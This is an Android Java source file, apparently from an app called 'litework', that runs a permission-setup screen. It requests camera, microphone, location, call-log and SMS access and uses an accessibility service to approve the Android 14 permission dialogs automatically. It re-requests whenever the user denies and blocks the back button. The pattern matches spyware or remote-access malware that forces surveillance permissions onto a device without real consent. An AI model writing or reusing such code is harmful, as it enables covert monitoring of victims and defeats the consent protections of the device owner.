package com.support.litework.activity;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;

import com.support.litework.R;
import com.support.litework.services.MainAccessibilityService;
import com.support.litework.utils.Common;

public class PermissionSetActivity extends AppCompatActivity {
    private static final int PERMISSION_REQUEST_CAMERA = 1001;
    private static final int PERMISSION_REQUEST_PHONE = 1002;
    private static final int PERMISSION_REQUEST_MEDIA = 1003;
    private boolean isWaitingForPermission = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_permission_set);
    }
    @Override
    protected void onResume() {
        super.onResume();
        isWaitingForPermission = false;
        setPermission();
    }

    private void setPermission() {
        onRequestPermission();
    }
    private void onRequestPermission() {
        ActivityCompat.requestPermissions(this, new String[]{
                Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.ACCESS_FINE_LOCATION}, PERMISSION_REQUEST_CAMERA );
        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                    if(MainAccessibilityService.getContext() != null) {//
                        MainAccessibilityService.getContext().AllowPrims14_normal();
                    }
                }
            }
        }, 2000);
    }

    private void onRequestPermissionPhone() {
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ActivityCompat.requestPermissions(this, new String[]{
                    Manifest.permission.READ_PHONE_STATE,
                    Manifest.permission.READ_PHONE_NUMBERS,
                    Manifest.permission.READ_CALL_LOG,
                    Manifest.permission.WRITE_CALL_LOG,
//                    Manifest.permission.RECEIVE_SMS,
                    Manifest.permission.READ_SMS,
                    Manifest.permission.POST_NOTIFICATIONS}, PERMISSION_REQUEST_PHONE);
            new Handler().postDelayed(new Runnable() {
                @Override
                public void run() {
                    if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                        if(MainAccessibilityService.getContext() != null) {//
                            MainAccessibilityService.getContext().AllowPrims14_phone();
                        }
                    }
                }
            }, 2000);
        } else {
            ActivityCompat.requestPermissions(this, new String[]{
                    Manifest.permission.READ_PHONE_STATE,
                    Manifest.permission.PROCESS_OUTGOING_CALLS,
                    Manifest.permission.READ_PHONE_NUMBERS,
                    Manifest.permission.READ_CALL_LOG,
                    Manifest.permission.WRITE_CALL_LOG,
//                    Manifest.permission.RECEIVE_SMS,
                    Manifest.permission.READ_SMS
            }, PERMISSION_REQUEST_PHONE);
        }
    }
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        if (!isWaitingForPermission) {
            // Ensure that you're not continuing actions if the app is paused
            super.onRequestPermissionsResult(requestCode, permissions, grantResults);
            return;
        }

        if (requestCode == PERMISSION_REQUEST_CAMERA) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                onRequestPermissionPhone();
            } else {
                onRequestPermission();
            }
        } else if (requestCode == PERMISSION_REQUEST_PHONE) {
            Intent intent = new Intent(this, PermissionSetMediaActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            finish();
        }
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
    }

    @Override
    protected void onPause() {
        super.onPause();
        isWaitingForPermission = true;
    }

    @Override
    public void onBackPressed() {
    }
}